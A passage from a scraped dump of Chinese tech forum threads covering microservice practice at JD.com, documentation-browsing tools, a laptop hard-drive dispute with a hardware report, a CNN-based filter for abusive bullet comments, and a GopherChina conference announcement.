包命令唯一不同的就是它的配置问题，你只要一上线，那边一监控就可以看到。因为你启动时候他有注册，注册基本上他要调哪些东西就能看到他注册的配置。</p>\n<p><strong>京东章耿：</strong>京东测试环境，预发，线上都是从源码库里编译为准。主干编译为准，所以说代码应该是一样的。线上配置我们是管理在配置中心，但是目前我们测试环境就没有这个东西。预发，线上有配置中心，这个配置中心也集成到我们那个发布平台 JOne 上。</p>\n</div></div>"], "reply": "4", "tittle": "京东、宅急送的微服务实践分享（下）| 架构师小组交流会", "comment": ["你是骑牛的？七牛刚扣了我 0.1 ，我是不是得找你", "思路都是差不多。", " 请问是因为什么原因扣费的呢？\r", " 万变不离其宗嘛", " #3 文档坑死人！拜托好好写一下吧！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>记得以前见过有一个 nodejs 工具，还是一个网站，能看到各种文档。\n比如 node ， php ， mysql ， nginx 。。。。等等的文章。\n毕竟工作中需要查手册的时候，一个个去查很麻烦。</p>\n<p>如果没有，可否推荐一个 linux 下方便用的爬虫，我去爬文档。谢谢！</p>\n</div></div>"], "reply": "14", "tittle": "哪里有能看到各种项目、工具的文档的网站，或工具？", "comment": ["网站： ", "\r", "软件： Dash\r", "下一题", "看着都挺不错 不过我还是喜欢直接 google", "直接 google 会少走很多弯路....", " nice", "讲道理不上官网，看到的都是旧东西", " +1", "Node.js 的工具 っ ", "\r", "其实就是 devdocs.io 而已", "dash 不就完了么", "自己写了个工具，把各种文档都添加进去，还能随时添加删除，用起来还是很爽的", "Zeal 好像是用 Dash 的代码做的，文档直接用的 Dash 的。目前正在使用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"jt.png\" src=\"https://ooo.0o0.ooo/2017/02/06/58983e60b20b9.png\"><br>\n旺旺有证据啊..往哪跑,同车次的 V 友,虽然不同型号,但是机械硬盘也是希捷.<br>\n其他配置在下面,懂得 V 友可以帮忙来<code>大家来找茬</code>.\n希捷还是<code>5400</code>转的..<br>\n<strong>5400 和 7200 两个机械硬盘的转速,区别很大吗?</strong></p>\n<pre><code>--------[ 鲁大师 ]--------------------------------------------------------------------------------\n\n  软件:             鲁大师 5.15.16.1175\n  时间:             2017-02-06 17:02:11\n  网站:             http://www.ludashi.com\n\n--------[ 概览 ]----------------------------------------------------------------------------------\n\n  电脑型号            Notebook N85_N87,HJ,HJ1,HK1 笔记本电脑\n  操作系统            Windows 10 64 位 ( DirectX 12 )\n\n  处理器              英特尔 Core i7-7700HQ @ 2.80GHz 四核\n  主板                Notebook N85_N87,HJ,HJ1,HK1 ( 英特尔 Xeon E3 - 1200 v6/7th Gen Intel Core/DRAM Registers - 5910 - 100 Series/C230 Series 芯片组 Family - )\n  显卡                Nvidia GeForce GTX 1050 Ti ( 4 GB )\n  内存                8 GB ( 英睿达 DDR4 2133MHz )\n  主硬盘              三星 MZNTY256HDHP-00000 ( 256 GB / 固态硬盘 )\n  显示器              京东方 BOE062F ( 15.3 英寸  )\n  声卡                瑞昱 ALC269 @ 英特尔 High Definition Audio 控制器\n  网卡                瑞昱 RTL8168/8111/8112 Gigabit Ethernet Controller / 蓝天(CLEVO)\n\n--------[ 主板 ]----------------------------------------------------------------------------------\n\n  主板型号            Notebook N85_N87,HJ,HJ1,HK1\n  芯片组              英特尔 Xeon E3 - 1200 v6/7th Gen Intel Core/DRAM Registers - 5910 - 100 Series/C230 Series 芯片组 Family -\n  BIOS                1.05.01  /  制造日期: 2016 年 12 月 13 日\n\n\n--------[ 处理器 ]--------------------------------------------------------------------------------\n\n  处理器              英特尔 Core i7-7700HQ @ 2.80GHz 四核\n  速度                2.81 GHz (100 MHz x 28.0)\n  处理器数量          核心数: 4 / 线程数: 8\n  插槽 /插座           U3E1\n  一级数据缓存        4 x 32 KB, 8-Way, 64 byte lines\n  一级代码缓存        4 x 32 KB, 8-Way, 64 byte lines\n  二级缓存            4 x 256 KB, 4-Way, 64 byte lines\n  三级缓存            6 MB, 12-Way, 64 byte lines\n  特征                MMX, SSE, SSE2, SSE3, SSSE3, SSE4.1, SSE4.2, HTT, EM64T, EIST, Turbo Boost\n\n--------[ 硬盘 ]----------------------------------------------------------------------------------\n\n  产品                三星  MZNTY256HDHP-00000 (固态硬盘)\n  大小                256 GB\n  硬盘已使用          共 7 次，累计 6 小时\n  固件                MAT2100Q\n  接口                SATA III\n  数据传输率          600 MB/秒\n  特征                S.M.A.R.T,  48-bit LBA,  NCQ\n\n  产品                希捷 ST1000LM035-1RK172\n  大小                1 TB\n  转速                5400 转 /分\n  缓存                128 MB\n  硬盘已使用          共 12 次，累计 6 小时\n  固件                SDM1    \n  接口                SATA III\n  数据传输率          600.00 MB/秒\n  特征                S.M.A.R.T,  APM,  48-bit LBA,  NCQ\n\n--------[ 内存 ]----------------------------------------------------------------------------------\n\n  DIMM0               英睿达 DDR4 2133MHz 8GB\n  制造日期            2016 年 10 月\n  型号                7F7F7F7F7F9B CT8G4SFS8213.C8FBD1\n  序列号              1444409D\n  厂商                Crucial\n  模块位宽:           64 Bits\n  模块电压:           SSTL 1.2V\n\n--------[ 显卡 ]----------------------------------------------------------------------------------\n\n  显卡                英特尔 HD Graphics 630\n  显存                128 MB\n  制造商              蓝天(CLEVO)\n  制造商              Intel\n  驱动版本            21.20.16.4550\n  驱动日期            2016 年 11 月 01 日\n\n  主显卡              Nvidia GeForce GTX 1050 Ti\n  显存                4 GB\n  制造商              Nvidia\n  驱动版本            21.21.13.7572\n  驱动日期            2016 年 02 月 01 日\n\n--------[ 显示器 ]--------------------------------------------------------------------------------\n\n  产品                京东方 BOE062F\n  厂商                京东方\n  固件日期            2015 年 01 月\n  屏幕尺寸            15.3 英寸 (34 厘米 x 19 厘米)\n  显示比例            宽屏 16 : 9\n  分辨率              1920 x 1080 32 位真彩色\n  Gamma               2.20\n  最大分辨率          1920 x 1080\n\n--------[ 其他设备 ]------------------------------------------------------------------------------\n\n\n  网卡                瑞昱 RTL8168/8111/8112 Gigabit Ethernet Controller\n  制造商              蓝天(CLEVO)\n\n  无线网卡            英特尔 Dual Band Wireless-AC 3165\n\n  声卡                瑞昱 ALC269 @ 英特尔 High Definition Audio 控制器\n\n  键盘                PS/2 标准键盘\n  键盘                HID 标准键盘\n  鼠标                HID-compliant 鼠标\n  鼠标                Synaptics SMBus 触摸板\n  鼠标                HID-compliant 鼠标\n\n  摄像头              Chicony USB2.0 Camera\n\n--------[ PCI 设备 ]-------------------------------------------------------------------------------\n\n  设备                Xeon E3 - 1200 v6/7th Gen Intel Core Host Bridge/DRAM Registers - 5910\n  设备 ID              5910\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to HOST\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                Xeon E3 - 1200/1500 v5/6th Gen Intel Core PCIe Controller  - 1901\n  设备 ID              1901\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to PCI\n  子系统 ID            00000000\n\n  设备                HD Graphics 630\n  设备 ID              591B\n  制造商              Intel\n  制造商 ID            8086\n  类别                Display / VGA\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                USB 3.0 eXtensible Host Controller\n  设备 ID              A12F\n  制造商              Intel\n  制造商 ID            8086\n  类别                Serial / USB (UHCI)\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                Management Engine Interface\n  设备 ID              A13A\n  制造商              Intel\n  制造商 ID            8086\n  类别                Simple Communication / Other\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                100 Series/C230 Chipset Family SATA AHCI Controller\n  设备 ID              A103\n  制造商              Intel\n  制造商 ID            8086\n  类别                Storage / Serial ATA (AHCI 1.0)\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                100 Series/C230 Series Chipset Family PCI Express Root Port #1 - A110\n  设备 ID              A110\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to PCI\n  子系统 ID            00000000\n\n  设备                100 Series/C230 Series Chipset Family PCI Express Root Port #5 - A114\n  设备 ID              A114\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to PCI\n  子系统 ID            00000000\n\n  设备                100 Series/C230 Series Chipset Family PCI Express Root Port #7 - A116\n  设备 ID              A116\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to PCI\n  子系统 ID            00000000\n\n  设备                100 Series/C230 Series Chipset Family LPC Controller  - A152\n  设备 ID              A152\n  制造商              Intel\n  制造商 ID            8086\n  类别                Bridge / PCI to ISA\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                100 Series/C230 Series Chipset Family PMC - A121\n  设备 ID              A121\n  制造商              Intel\n  制造商 ID            8086\n  类别                Memory / Other\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                High Definition Audio 控制器\n  设备 ID              A171\n  制造商              Intel\n  制造商 ID            8086\n  类别                Multimedia / Hi-definition Audio\n  子系统制造商        Clevo\n  子系统 ID            850B1558\n\n  设备                100 Series/C230 Series Chipset Family SMBus - A123\n  设备 ID              A123\n  制造商              Intel\n  制造商 ID            8086\n  类别                Serial / SMBus Controller\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                Realtek PCIE CardReader\n  设备 ID              5287\n  制造商              Realtek\n  制造商 ID            10EC\n  类别                 / \n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                RTL8168/8111/8112 Gigabit Ethernet Controller\n  设备 ID              8168\n  制造商              Realtek\n  制造商 ID            10EC\n  类别                Network / Ethernet\n  子系统制造商        Clevo\n  子系统 ID            850A1558\n\n  设备                Dual Band Wireless-AC 3165\n  设备 ID              3165\n  制造商              Intel\n  制造商 ID            8086\n  类别                Network / Other\n  子系统制造商        Intel\n  子系统 ID            40108086\n\n--------[ USB 设备 ]-------------------------------------------------------------------------------\n\n  制造商 ID            04F2\n  产品 ID              B59E\n  类别                239 / 2 / 1\n  设备                 \n  版本                USB 2.0\n\n  制造商 ID            18F8\n  产品 ID              0F97\n  类别                0 / 0 / 0\n  设备                ? USB OPTICAL MOUSE\n  Serial              ?\n  版本                USB 1.1\n\n  制造商 ID            8087\n  产品 ID              0A2A\n  类别                224 / 1 / 1\n  设备                 \n  版本                USB 2.0\n\n--------[ 传感器 ]--------------------------------------------------------------------------------\n\n  CPU 温度             42℃\n  CPU 核心             42℃\n  CPU 封装             42℃\n  显卡                35℃\n  硬盘温度            31℃\n</code></pre>\n</div></div>"], "reply": "57", "tittle": "[上船最新进展] 说发日立最后发了希捷", "comment": ["7200 稍微好一点吧", " 希捷.质量很好嘛?", "提升没有那么大， 7200 的噪音还大。不过如果商家说好 7200 ，发了 5400 不也是一种欺骗。。", "1050 Ti 有点亏吧？整机多少钱", " 希捷 7200 估计停产了，只剩下混合那个", "你还是发帖了", " 最后同意换啦", "加 SSD 吧 追求硬盘速度的话 就 SSD \r", "机械仓库盘也就存些电影 大姐姐之类的，", "希捷比日立好啊。不过 7200 转和 5000 转速度有差，但是声音也有差。总得来说 7200 转好一点", "会后悔的！靠谱的硬盘目前只能买日立和东芝。", "用过日立硬盘的路过，他换成希捷是在对你好", " 愿闻其详", "硬盘好坏主要看脸…", "机械硬盘看脸的 2333", "2.5 的 5400.。。。。。慢到娘都不认识。", "没用过日立一直久闻日立大名，真的这么不堪吗", " 6400  \r", "\r", "\r", "  自带 SSD  \r", "\r", "\r", " 所以日立走起  \r", "\r", "\r", " 什么鬼  \r", "\r", "\r", " 母鸡.", "就 2.5 机械盘的性能， 7200 唯一好处大概就是心理上舒服点。", "  不好意思，看错了，这是笔记本啊。。。。。。。那么。这个硬盘缓存还挺大。。", "经我手的日立都异常耐用，有个十几年没任何问题的 80G ，反而希捷已经黄了好几个了，前几年把家里的机械盘全卖了换 SSD", "笔记本硬盘,5400 和 7200,我自己的是 120m/s:150m/s,都是写入,7200 声音很大,比风扇声音都大,建议不要考虑.", "如果你上的神舟的话,推荐希捷酷鱼 128M 缓存 7mm 那款", "不太知道为什么会有人觉得 Seagate 好…可以参看如下文章，至少在 Server 领域， HGST 和 Toshiba failure rate 显著低于剩下两家。\r", "\r", " +1 速度并不会快多少  甚至没有感觉", " 希捷的顶峰时刻是酷鱼 7200.9 ，那个时候出的 80G ， 160G ， 500G 都是很耐用的。西数的蓝盘也不错，后续大家都集体 cost down 了，一直比较稳定的是日立，现在稍微好点的还一个是东芝，当然东芝也看型号。", "希捷宣布退出没几天， 4 年的硬盘无故完蛋了，之前看过没有坏道 没有问题的。前一天晚上还正常关机，然后，再也无法读到盘了， BIOS 和系统均无，只剩下个 120G 的固态", "据说最新的希捷单盘 1T 的 5400 已经不弱日立 7200 了......性能而言", "另外,有了固态的话机械之间的这点小性能差距其实没什么所谓,我觉得最重要的是换屏......", "速度没有区别，反而容易坏", "描述的不同颜色显示看起来很厉害", "真的看脸的， mac mini 的日立硬盘我崩过一台，东芝的 SSD 一年死俩,  迈拓和希捷的 HDD 倒是从没挂过", "神舟不是一向用日立吗？换希捷会比日立贵的。\r", "我这个日立的盘，读盘噪声哒哒的，我感觉用不了多久就挂了。", "日立硬盘部门应该是收购 IBM 的吧，，，，", "速度没有快多少，我自己的 7200 开一个 lol 比隔壁 5400 的还慢，到了晚上噪音明显听得出来稍微大一点，你自己拿测速软件测一下就知道了，真的快不了多少。", "还有你的显示屏是不是也有泛白而且色欲对比度很低啊？感觉京东方的显示器没几个好货。", "图吧基佬", "怎么没有说多少大洋，准备上船了~", "根据 n 年的实际经验和数据：日立硬盘的质量更好， 7200 的速度比 5400 不是快一点半点，特别是你用个 1-2 年，简直天差地别。", "好坏不论， 7200 比 5400 贵很多 退钱吧", " 我们选择换货", "我买了东芝", " 7200.7 是最后的良心吧?\r", "\r", "7200.9 那炒黄豆一样的声音真是噩梦", " #39 \r", "笔记本这东西 我更倾向于把 HDD 干掉 SSD 单跑 需要存储就移动硬盘\r", "这样抗造很多", "很迷地发现用过所有的机械硬盘都是希捷.... 反正到现在没用到过挂掉，反正硬盘寿命也算是玄学了 平时做好备份吧", "HGST 的企业级可是很牛的，日立的笔记本硬盘不做评价。", "希捷好像贵点，日历便宜", "希捷好像质量不咋的？\r", "但是有聊天记录应该要给你用日立啊\r", "不然算是诈骗？", " 主要是要一直记得带移动硬盘=。=", "4 年坏一个希捷的别说了！我半年坏一个三星 SSD ！", "我的老爷船上还有个 80g 的日立，虽然是 7200 转的，但是速度只有 30MB/s\r", "\r", "另一个 320 的本盘挂在 PC 上当下载盘\r", "\r", "顺便提一下，台式机上有个日立 500g3.5 寸 25000 小时左右安静地挂了，之前 SMART 一切正常，也没有什么异常表现，突然盘符就消失了， BIOS 和系统都再也没发现过它，好在没什么重要数据，不知道另一块还能坚持多久\r", " 加的机械. 并非官方\r", "\r", " 6K3 我的差不多是顶配了, 欢迎来上船 cee+pDU4MjU1MTc3Ng==\r", "\r", " 阔怕,不过有保修.. 我东西不放 c 盘的\r", "\r", " 估计每个人都这么说,但是最后给希捷\r", "\r", "\r", " \t在用的一个希捷.. 很给力了.\r", "\r", "```\r", "产品\t希捷 ST1000LM024 HN-M101MBB\r", "容量\t1 TB\r", "形状特征\t2.5 寸\r", "转速\t5400 转 /分\r", "缓存\t8 MB\r", "硬盘已使用\t共 2325 次，累计 16455 小时\r", "固件\t2AR10001\r", "接口\tSATA III\r", "数据传输率\t300.00 MB/秒\r", "内部数据传输率\t1160.00 Mb/秒\r", "特征\tS.M.A.R.T,  APM,  48-bit LBA,  NCQ\r", "平均寻道时间\t12.00 毫秒\r", "起旋时间\t4.00 毫秒\r", "延迟时间\t5.60 毫秒\r", "外形尺寸\t69.75 x 100.30 x 9.50 毫米\r", "重量\t107 克\r", "\t\r", "```", "楼主升级配置了吗？好像买贵了，京东 5999\r", "10 年的希捷移动硬盘 全盘扫描全绿   笔记本的日历硬盘已经售后换了好几波了  \r", "机械硬盘主要看脸", "机械硬盘主要看脸", " ..居然回复了同样的一句话 囧\r", "\r", "楼主不要迷信机械硬盘牌子 就那样吧", "三年多希捷 9yn162 健康还剩 4%，感觉随时要完，还没有老 80G 硬盘耐用", "看脸+3 年之后直接干掉。", "大学时组的希捷酷鱼 80G ， 7200.X （忘记是几了），年前我爸说“你大学时的台式吃灰”，然后我清理了灰尘插线，随手扫了一下硬盘--全绿。", "所以比较赞同那句话：机械硬盘主要看脸。"]},
{"content": ["<div class=\"topic_content\">比方说，我写一个爬虫，需要有 spider main 模块，以及 html_downloader ， parser ， outputer 模块， eclipse 能通过 pypev 直接创建， notepad++如何做到呢？\r<br>\r<br>本人小白，各位轻拍。</div>"], "reply": "6", "tittle": "正在学习 Python 爬虫的相关课程，请教 notepad++能实现 eclipse 的创建不同模块功能吗？", "comment": ["闲得慌", "没用过 Pycharm 就别说自己写过 Python ，、逃", "感觉我看过你这个课程、手动创建吧、用不了多少时间、", "2 楼真相了", " 为何不提 wingide 咯？ pycharm 好慢的感觉", " pycharm 只是启动的时候慢，编写代码完全没问题啊，没听过 wingide"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://yinzo.github.io/14863637393852.html\" rel=\"nofollow\">https://yinzo.github.io/14863637393852.html</a></p>\n<p>使用的是 TensorFlow 后端的 keras ， 3000 条弹幕的识别时间在 5s 左右(指的是 <code>model.predict</code> 的单句计时 5s 左右)，可能是 model 隐层节点太多了？不知道前辈们有没有一些提高速度的方法呢，如果能帮我指一下方向那将会非常有帮助:D</p>\n<p>接下来准备继续学 RNN 以及 LSTM 来继续优化这个玩具分类器:D</p>\n<p>另外后排继续寻找广州的机器学习实习岗，希望有 dalao 收留<a href=\"http://yinz.xyz/resume\" rel=\"nofollow\">简历在这里</a></p>\n</div></div>"], "reply": "80", "tittle": "使用卷积神经网络与代理服务器实现骂人弹幕的自动屏蔽", "comment": ["朱芳芳迷弟路过", " 2333 我也！", "很有意思。\r", "\r", "话说我在想，我们也需要类似的技术来识别水贴……\r", "\r", "赠送你 1 个小时的置顶 :)", " 这个鼓励非常大 XD 这次实现觉得最困难在于样本获取，我是日思夜想怎么弄到 B 站举报弹幕的数据，相信 Livid 作为站长应该是不存在这个问题的 :D", "默默支持 LZ ，武运昌隆 23333", " hhhhh 给阿毛拜个晚年", "朱芳芳女粉路过", "光用 gensim 不也行吗？ svm 训练好，分类就是毫秒之间", "电竞恶霸朱芳芳,等一个开黑   你被强化了啦#5167", " svm 确实没有尝试过，效率这么高吗，我觉得我可以去尝试一下，因为这边 CNN 效率算下来也是 1.7 毫秒 /条", "只要样本多。用朴素贝叶斯也可以啊", " 2333 对的，我之前用的贝叶斯分类器写过，但是就是训练数据必须得符合现实分布，样本收集起来就很麻烦。而这里我是通过搜索关键词收集的骂人弹幕，所以就方便一点。", "厉害了 同求广州地区网工运维职位", "直播官方没法屏蔽弹幕拉黑人真的是硬伤。。。\r", "之前做了个 js 版熊猫 tv 弹幕的 filter ，只能屏蔽指定关键字，结合这个后端就方便多了，支持下。\r", "另外要不要稍微改下变成反代版的？这样改 hosts 就行了，不影响正常上网。", "请问深圳的岗位考虑吗？", " 原本我也是想着通过 host 来解决的，不过想起 Surge 有 URL Rewrite 就直接用了 XD ，我想大概改 host 也能直接生效？", " 深圳也是可以考虑的，不过可能就是需要很适合我才会去的了，因为下学期还有两门课可能需要我来回两头跑 \r", "\r", "说得比较直接，望见谅 :D", "记得 keras 代码里面的一个例子就是用 RNN 做分类器，可以试试。", " 感谢，我可以参考一下:D", " 当然，鹅厂的话我觉得是值得我两头跑的 :D", " 如果从自然语义上着手， 窃以为 word2vec 实现词汇聚类后，用 dnn 做分类， 也许有效果。", " 给你发了邮件 麻烦查收下哈", " 训练好的模型做成 chrome 插件就好了", " 主要这些弹幕播放器都是多平台的， chrome 插件不方便 app 等其他平台的直接套用 XD", "如果能自动骂人,我觉得这项目的关注度会上一个台阶.(认真脸) (逃", " hhhhhh 好主意，可以顺便拿收集到的数据用 RNN 训练个 language model 来自动骂人 (逃", " \r", "果然战争和黑产永远是技术发展和应用的最大推动力", " 可以多抓取几次 看哪些弹幕没有了啊", " 思考了一下，有点难，毕竟举报处理是 up 主负责的，处理的速度也很慢，跟不上弹幕的增加速度，一般换弹幕池了举报都没解决呢...", "晕咗迷弟前来参拜;D", "可以考虑一下 GAN\r", "这样子你还能够顺便获得一个骂人水平很高的发帖机器 233", " GAN 指的是 Generative Adversarial Networks 吗，是个没了解过的网络呢 :D\r", "不过通过生成样本来提高样本量这个思路好像在哪篇论文里看到过 XD 我找时间深入了解下看看 XD", "模型看起来不错，你不是分了 validate 数据吗？准确率多少？", "很不错！膜下", " 最终这个模型我测试了 20 次迭代，最后选的是第三次迭代的， Validation Accuracy 是 97.060%，训练部分的详细数据可以看这篇文章 :D \r", "建议跟官方反映一下，我觉得 b 站应该是很乐意看到这些东西的，顺便一提要是想要高质量的骂人弹幕请去乐视，腾讯网的弹幕抓取。。。 70%都是喷子", "这个可以学习一下。", "还是有不少可以改进的。\r", "看了你的模型\r", "1. 这么少的数据，其实 dropout 是很重要的，但是没做\r", "2. 最后一个 sigmoid 就好了，二分类不要 softmax ，白白浪费空间\r", "3. 其实这个应用最有效的是关键词过滤，其他的都没用，你用什么方法最后其实内部都成为某种意义的关键词查找而已。虽然理解你想用 deep learning ，但是其实有的时候并不是最复杂的方法就最好用的。\r", "\r", "另外简历里面用 python 居然没有用 numpy 为何还要写出来自曝其短。", "监督学习速度快很多啊", " 首先感谢建议:D\r", "\r", "关于关键词过滤我是有这样的想法的，我平时过滤弹幕的做法通常都是看到某些弹幕后才寻找关键词加入屏蔽列表，但是长期下来总是有许多新的关键词出现，正是这些层出不穷的漏网之鱼（词）使我产生了使用机器学习来屏蔽的想法的。\r", "\r", "我使用神经网络，是希望它能够在大量的骂人弹幕中，寻找出一些相对明显的，人工注意不到的特征（当然这些特征里面很可能也包括关键词特征），这也是我使用 CNN 而不是普通 MLP 的原因:) \r", "\r", "如果单从识别并找出最佳的屏蔽关键词的角度来说的话，我觉得决策树可能是一个非常合适的选择\r", "\r", "另外我是有使用 numpy 的，包括这个项目，只不过并不算非常熟练我也不太好意思写出来献丑了:D", " 其实你的想法很好，但是由于人脑和中文的神奇性，中文的骂人话（写出来的（包括垃圾弹幕））会比你想象的要多，同音字，拆字，谐音字，等等，人工都不一定屏蔽的完，机器的话一定会有很多误杀，就比如垃圾弹幕中最明显的一个刷颜色。", " 其实你所说的同音字，拆字，谐音字等问题，按我的理解，在 word2vec model 上就已经解决掉了， word2vec 一定程度上解决了自动识别语义相近的词语的问题 :O", " 其实关键词不一定是以列表形式存在的，一个 bow+svm 其实也是关键词。", " 话说 B 站好像现在也在测试一种有可能会减少低素质弹幕的功能..不过默认情况下没有开启.要自己手动开.\r", " ", " 2333 这个功能我有注意，我原本还尝试通过求这两个模式下的差集来快速获得屏蔽弹幕呢，但是当我求完差集出来一看，这个过滤效果更像是大规模无差别灭杀 2333 ，不排除可能是通过筛选节操值小于特定阈值的用户弹幕产生的弹幕池 XD", " 你不妨试试发邮件给 B 站推荐下 :-)", "不过我之前看到猪场有类似基于机器学习类似的识别垃圾信息的产品 有兴趣可以去交流交流？", " 你想多了。。这个只是 UP 主屏蔽的别名。。 @", " 这功能开启后很多视频里的弹幕数直接少一大半.目测应该不是对应的 UP 主屏蔽.", " 是的。是整合了很多的 up 屏蔽的，我记得没错的话是关键字加 uid", " 同意.", " 并不是 up 主屏蔽 XD 你可以观察一下开关这个选项前后的弹幕池，开选项之前是 ", " ， 开启之后变成了 ", "\r", "\r", "另外 up 主屏蔽的 api 是这样的 ", "\r", "XD", "1. 只用 Word2vec 加关键词即可， CNN 应该并不能明显提升 acc\r", "2. 训练数据太少", " 请问第一点能否展开一点说呢:D \r", "\r", "因为我的目标是能够识别出包括无脏字的反讽弹幕，这一定程度上涉及了语义的问题，我思考了一段时间，还是没有想到关键词如何实现这样的目标，希望能够获得进一步的指点 :O", "这种识别 spam 的 naive bayes 真的很好用", "加 L1 正则会不会好点？", " 如果一个人在直播打游戏，打得很垃圾，然后弹幕有人说你好厉害哦，这情况应该属于反讽了吧，首先你要知道那个人打得拉不垃圾，垃圾的标准是什么，真不知道你们搞机器学习怎么办到的", "哈哈，你的文章的视频例子是泡泡爆炸后 carry 的那一个吧。 @", "支持一下，最近我也在搞类似的分类器~", "有没有屏蔽空耳的。。。。", " 感谢提醒！确实没在 loss function 上做太多的优化，我后续会尝试加入一些 regularization 来看看效果的 :D", " 其实不必要把目光只放在单条弹幕上，比如说我们可以通过同时分析最近的所有弹幕，若所有弹幕都在说垃圾，只有一条在叫好，那么这也是一个比较明显的特征。若加上一些其他的特征作为辅助，可能就能实现识别反讽的这一目标了。", " 哈哈哈哈对的，心疼泡泡被带一下午节奏", " 你这么一说，好像空耳还真的挺难识别的。。不过一般空耳的句子流畅度、语义一致性和弹幕长度等特征应该会和普通弹幕有所区别，说不定也是可以做到的，这个得下手试过才能知道了", "听说 twitch.tv 就是这么屏蔽脏弹幕的", " 需要技术支持么， AI 从业人员可以无偿提供相关支持", " 别闹，朴素贝叶斯和其他分类器比最大的特点就是对数据分布没有要求", " char level cnn 最大的作用在于经过混淆的没有语义含义的语句，比如 anti spam ：“激.情|裸一聊一加 v ： xxx ”\r", "这种，对于弹幕识别， char cnn 不是合适的应用场景。\r", "RNN 和 LSTM 更是了，弹幕没有 context ，你要 memory 有什么用？\r", "\r", "这个场景最适合的方法还是传统机器学习方法。这不是一个复杂的 task 。", " 。。。正则是训练一个分类器首先想到的东西，必须加在 loss 里面，没有正则的 NN 几乎是必然过拟合的", "文本是 linear separatable 很强的东西，单在 text classification 方面，用 linear kernel 的 svm 是非常好的做法。", " 之前的贝叶斯是我按照自己的理解写的，我对朴素贝叶斯的理解可能存在问题，我是这么理解的：\r", "\r", "通过独立同分布的训练集，估计出每一类的先验概率 P(c) ，然后再估计出每个属性(词)的条件概率 P(x|c)，由此计算出每个词对应的 P(c|x)\r", "这里提到了同分布，如果分布不同，如何能估计出正确的 P(c) 呢\r", "\r", "关于 context ，我是打算要把整个视频的弹幕作为 context 的，当然，我还没有实际学习过这两个模型，并没有什么明确的观点。\r", "\r", "『没有正则的 NN 几乎是必然过拟合』这个观点请问是你的经验吗，因为在这个项目里我是通过人工观察 train acc 和 validation acc 来选择的模型，相当于人肉 early stopping ，不知道这样的模型是否也是过拟合的呢？\r", "\r", "不过看来 bow+svm 确实是个好模型，我需要尝试一下了", " 不是你找到好的 round 停下就没有过拟合的。参数爆炸带来的过拟合是没法避免的，即使在 loss 最低点也是过拟合状态。", "RNN 系列 NN 的重要假设就是， t-k 状态对 t 状态的 label 是有影响的，不是自己强行组合一个 context 就能套用 RNN 。", "隔壁院所的来支持一下，学习机器学习中", " 感谢指导:D \r", "我还没有了解过参数爆炸这个概念，还是有很长的路要走。 RNN 这边还没有深入学习，等我学习过后或许提出的观点会更可行一点吧 :D\r", "\r", "另外关于贝叶斯的样本分布问题还请赐教 :D", "最好的效果应该从弹幕本身出发，更多地挖掘弹幕自身的特征。\r", "\r", "general 来说，朴素贝叶斯应该是性价比最高的算法。", " 好像有看到一个项目是识别标题党的", " 我这里有份过滤表列。大概能过滤 70% 左右空耳。\r", "我最近也在做一个大概有点像 AdBlock 这样的东西过滤 B 站弹幕，以后订阅一下就好。\r", "嗯.... 按照目前的进度... 明年吧...\r", "\r", "楼主方便留个联系方式不，推荐个实习岗位", "可以加我 qq 63600154"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>时间如梭，转眼又到了一年一度的 Gopher 大会了，我们也正式启动了明年的大会筹备活动。</p>\n<p>GopherChina 是中国的最权威和最实力干货的 Go 大会，我们致力于为中国广大的 Gopher 提供最好的大会，我们本着非盈利目的来举办大会，前面两届大会在上海和北京都获得了非常好的口碑，今年我们大会将在四月份举办大会。举办 Gopher 大会，主要是汇集 Gopher 的广大开发者，聚集一批大规模应用 Go 的示范企业给大家分享，呈现一场 cool 的盛会。</p>\n<p>这是 2015 年 Go 作者之一 Robert 参会之后写的博客： <a href=\"https://blog.golang.org/gopherchina\" rel=\"nofollow\">https://blog.golang.org/gopherchina</a></p>\n<p>第一届我们的大会参会人数是 500 人，去年在北京差不多达到了 1000 人的规模， 今年我们组织了 1500 人的场地，面向的受众也是越来越多，同时我们也邀请了 Go team 的同学过来分享。</p>\n<p>我们的传统就是每年大会提供一件限量版的 T 恤：</p>\n<p><img alt=\"\" src=\"https://github.com/gocn/images/blob/master/WX20170123-224148%402x.png?raw=true\"></p>\n<p>报名地址： <a href=\"http://www.bagevent.com/event/357764\" rel=\"nofollow\">http://www.bagevent.com/event/357764</a></p>\n<p>如果有任何赞助意向的公司，也请联系我。 xiemengjun@gmail.com</p>\n</div></div>"], "reply": "5", "tittle": "第三届 GopherChina 上海大会正式启动了", "comment": ["去年北京去了\r", "今年也买票了\r", "支持", "不错不错", "支持", " 谢谢支持啊", "哪里有讲师介绍？"]},
